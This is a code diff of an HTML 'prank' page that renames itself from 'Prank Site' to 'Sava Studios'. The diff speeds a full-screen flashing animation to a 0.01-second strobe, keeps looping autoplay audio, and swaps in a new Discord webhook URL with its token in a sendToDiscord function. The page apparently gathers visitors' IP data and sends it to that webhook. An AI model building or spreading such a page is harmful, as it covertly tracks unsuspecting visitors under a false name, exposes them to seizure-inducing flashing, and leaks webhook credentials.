@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Prank Site</title>
+    <title>Sava Studios</title>
     <style type="text/css">
         body {
             margin: 0;
@@ -35,7 +35,7 @@
             background-size: cover;
             background-position: center;
             z-index: 1;
-            animation: flash 1s infinite;
+            animation: flash 0.01s infinite;
         }
         @keyframes flash {
             0%, 50% {
@@ -55,6 +55,7 @@
     <div id="ipResult"></div>
 </div>
 
+<!-- Autoplay sound -->
 <audio id="prankSound" src="sound.mp3" autoplay loop></audio>
 
 <script>
@@ -82,7 +83,7 @@
     }
 
     function sendToDiscord(data) {
-        const webhookUrl = "https://discord.com/api/webhooks/1322344664359239720/OP-GxUPNa6rkUfz52ovgWpFBd0aDhghLDaNpwuEc5XxaYJqahFqr4PwaDiKRaJYRFAg9";
+        const webhookUrl = "https://discord.com/api/webhooks/1187118326380503040/d24deoHu0s7_VCgx02QwPLQLGVzQnoOeCzhvM1DDxcZULyPQoQXhUuW8pQpsm1O0zFGu";
         const payload = {
             embeds: [
                 {
